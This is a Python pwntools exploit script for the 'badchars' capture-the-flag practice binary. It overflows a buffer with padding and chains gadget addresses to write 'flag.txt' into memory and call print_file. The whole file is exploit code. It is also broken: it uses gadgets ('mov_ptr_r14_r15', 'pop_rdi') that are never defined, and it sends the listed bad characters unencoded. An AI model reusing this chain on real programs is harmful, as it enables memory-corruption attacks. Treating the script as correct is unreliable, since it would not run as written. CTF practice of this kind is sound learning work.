from pwn import *

context.arch = "x86_64"

elf = ELF("./badchars")

gs = """
b pwnme
b *pwnme+141
c
"""

io = gdb.debug(elf.path)

"""
badchars are: 'x', 'g', 'a', '.'
              0x78 0x67 0x61 0x2e
"""
# parameters order: RDI, RSI, RDX, RCX, R8, R9
# r14b = first byte of r14 register
xor_ptr_r15_r14b = 0x0000000000400628 # xor byte ptr [r15], r14b ; ret
add_ptr_r15_r14b = 0x000000000040062c # add byte ptr [r15], r14b ; ret
pop_r15 = 0x00000000004006a2 # pop r15 ; ret
pop_r14_r15 = 0x00000000004006a0 # pop r14 ; pop r15 ; ret
pop_r12_r13_r14_r15 = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_ptr_r13_r12 = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret
call_print_file = 0x0400620
hold_flag = 0x0601028

def write(to, what):
    return flat(
            pop_r14_r15,
            to,
            what,
            mov_ptr_r14_r15
            )

io.sendline(b"A" * 40 + \
        write(hold_flag, "flag.txt") + \
        p64(pop_rdi) + \
        p64(hold_flag) + \
        p64(call_print_file))

io.interactive()
